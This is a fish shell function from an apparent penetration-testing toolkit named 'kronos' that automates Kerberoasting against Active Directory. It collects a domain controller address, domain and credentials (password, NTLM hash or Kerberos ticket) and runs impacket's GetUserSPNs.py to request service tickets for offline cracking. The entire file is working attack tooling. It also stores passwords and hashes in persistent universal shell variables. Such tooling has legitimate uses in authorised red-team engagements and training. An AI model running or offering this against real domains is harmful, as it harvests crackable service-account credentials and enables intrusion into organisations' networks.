# description: Run Kerberoasting using GetUserSPNs.py
function __kronos_kerberoast --description "Run Kerberoasting using GetUserSPNs.py"
    set -l wizard 0
    if test (count $argv) -eq 0
        set wizard 1
    end

    argparse t/target= h/help u/username= p/password= H/hash= d/domain= T/target-user= k/kerberos X/edit-cmd q/quiet w/wizard -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos kerberoast [TARGET] [OPTIONS]"
        echo ""
        echo "Run Kerberoasting using impacket's GetUserSPNs.py."
        echo ""
        echo "Options:"
        echo "  -t, --target IP         Target IP or Hostname"
        echo "  -T, --target-user USER  Only roast this specific user (defaults to all users)"
        echo "  -u, --username USER     Auth username"
        echo "  -p, --password PASS     Auth password"
        echo "  -H, --hash HASH         Auth NTLM hash"
        echo "  -d, --domain DOMAIN     Target domain name"
        echo "  -k, --kerberos          Use Kerberos authentication"
        echo "  -X, --edit-cmd          Inspect and edit the command before execution"
        echo "  -q, --quiet             Skip prompts and use cached/default values"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l target $_flag_target
    if test -z "$target"; set target $argv[1]; end
    set -l domain $_flag_domain
    set -l user $_flag_username
    set -l pass $_flag_password
    set -l hash $_flag_hash
    set -l target_user $_flag_target_user

    # Target Priority: Cache -> $TGT -> $TGT_DC_IP -> $TGT_DC -> $TGT_HOSTS[1]
    set -l def_target "$__KRONOS_CACHE_KERBEROAST_TARGET"
    set -l src_target "Cache"
    if test -z "$def_target"; set def_target "$TGT"; set src_target "TGT"; end
    if test -z "$def_target"; set def_target "$TGT_DC_IP"; set src_target "TGT_DC_IP"; end
    if test -z "$def_target"; set def_target "$TGT_DC"; set src_target "TGT_DC"; end
    if test -z "$def_target"; set def_target "$TGT_HOSTS[1]"; set src_target "TGT_HOSTS"; end

    # Domain Priority: Cache -> $TGT_HOSTS[1] -> $TGT_DC_DOMAIN
    set -l def_domain "$__KRONOS_CACHE_KERBEROAST_DOMAIN"
    set -l src_domain "Cache"
    if test -z "$def_domain"; set def_domain "$TGT_HOSTS[1]"; set src_domain "TGT_HOSTS"; end
    if test -z "$def_domain"; set def_domain "$TGT_DC_DOMAIN"; set src_domain "TGT_DC_DOMAIN"; end

    # User priority
    set -l def_user "$__KRONOS_CACHE_KERBEROAST_AUTH_USER"
    set -l src_user "Cache"
    if test -z "$def_user"; set def_user "$TGT_USERNAME"; set src_user "TGT_USERNAME"; end
    if test -z "$def_user"; set def_user "$TGT_CRED_USERNAME"; set src_user "TGT_CRED_USERNAME"; end

    if not set -q _flag_quiet; and begin test "$wizard" -eq 1 -o -z "$target"; or set -q _flag_wizard; end
        set_color cyan; echo "[*] Starting Kerberoast wizard..."; set_color normal

        if test -n "$target"; set def_target "$target"; set src_target "CLI Arg"; end
        set target (__kronos_ask "Target DC IP/Hostname" "$def_target" "$src_target"); or return 1
        set -U __KRONOS_CACHE_KERBEROAST_TARGET "$target"

        if test -n "$domain"; set def_domain "$domain"; set src_domain "CLI Arg"; end
        set domain (__kronos_ask "Domain Name" "$def_domain" "$src_domain"); or return 1
        set -U __KRONOS_CACHE_KERBEROAST_DOMAIN "$domain"

        set -l roast_all (__kronos_ask_confirm "Kerberoast ALL accounts?" y); or return 1
        if test "$roast_all" = "no"
            set -l def_target_user "$__KRONOS_CACHE_KERBEROAST_TARGET_USER"
            set -l src_target_user "Cache"
            if test -n "$target_user"; set def_target_user "$target_user"; set src_target_user "CLI Arg"; end
            set target_user (__kronos_ask "Specific user to roast" "$def_target_user" "$src_target_user"); or return 1
            set -U __KRONOS_CACHE_KERBEROAST_TARGET_USER "$target_user"
        else
            set target_user ""
        end

        if not set -q _flag_kerberos
            if test -n "$user"; set def_user "$user"; set src_user "CLI Arg"; end
            set user (__kronos_ask "Auth Username" "$def_user" "$src_user"); or return 1
            set -U __KRONOS_CACHE_KERBEROAST_AUTH_USER "$user"

            set -l def_auth_val "$__KRONOS_CACHE_KERBEROAST_AUTH_VAL"
            set -l src_auth_val "Cache"
            if test -z "$def_auth_val"; set def_auth_val "$TGT_PASSWORD"; set src_auth_val "TGT_PASSWORD"; end
            if test -z "$def_auth_val"; set def_auth_val "$TGT_CRED_PASSWORD"; set src_auth_val "TGT_CRED_PASSWORD"; end
            if test -n "$pass"; set def_auth_val "$pass"; set src_auth_val "CLI Pass"; end
            if test -n "$hash"; set def_auth_val "$hash"; set src_auth_val "CLI Hash"; end

            set -l auth_input (__kronos_ask "Auth Password or Hash" "$def_auth_val" "$src_auth_val"); or return 1
            set -U __KRONOS_CACHE_KERBEROAST_AUTH_VAL "$auth_input"
            
            if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$auth_input"
                set hash "$auth_input"; set pass ""
            else
                set pass "$auth_input"; set hash ""
            end
        end
    else
        # Quiet mode or non-wizard: fall back to defaults if empty
        if test -z "$target"; set target "$def_target"; end
        if test -z "$domain"; set domain "$def_domain"; end
        if test -z "$user"; set user "$def_user"; end

        if not set -q _flag_kerberos; and test -z "$pass"; and test -z "$hash"
            set -l auth_input "$__KRONOS_CACHE_KERBEROAST_AUTH_VAL"
            if test -z "$auth_input"; set auth_input "$TGT_PASSWORD"; end
            if test -z "$auth_input"; set auth_input "$TGT_CRED_PASSWORD"; end
            if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$auth_input"
                set hash "$auth_input"
            else
                set pass "$auth_input"
            end
        end
    end

    if test -z "$target"; echo "error: target is required" >&2; return 1; end
    if test -z "$domain"; echo "error: domain is required" >&2; return 1; end

    set -l impacket_cmd ""
    if command -v GetUserSPNs.py >/dev/null; set impacket_cmd GetUserSPNs.py
    else if command -v impacket-GetUserSPNs >/dev/null; set impacket_cmd impacket-GetUserSPNs
    else; echo "error: GetUserSPNs not found. run 'kronos install'." >&2; return 1; end

    set -l roast_cmd "$impacket_cmd"
    set -l roast_args -dc-ip "$target"
    if set -q _flag_kerberos
        set -a roast_args -k -no-pass "$domain/$user"
    else if test -n "$hash"
        set -a roast_args -hashes "$hash" "$domain/$user"
    else
        if test -z "$user"; or test -z "$pass"
            echo "error: credentials or kerberos flag required" >&2; return 1
        end
        set -a roast_args "$domain/$user:$pass"
    end

    if test -n "$target_user"
        set -a roast_args -request-user "$target_user"
    else
        set -a roast_args -request
    end

    set -l full_cmd "$impacket_cmd "(string join ' ' -- $roast_args)
    if set -q _flag_edit_cmd
        set full_cmd (__kronos_edit_cmd "$full_cmd"); or return 1
    end

    __kronos_check_dep $impacket_cmd; or return 1
    echo "[*] Running $impacket_cmd against $target..."
    eval $full_cmd
end
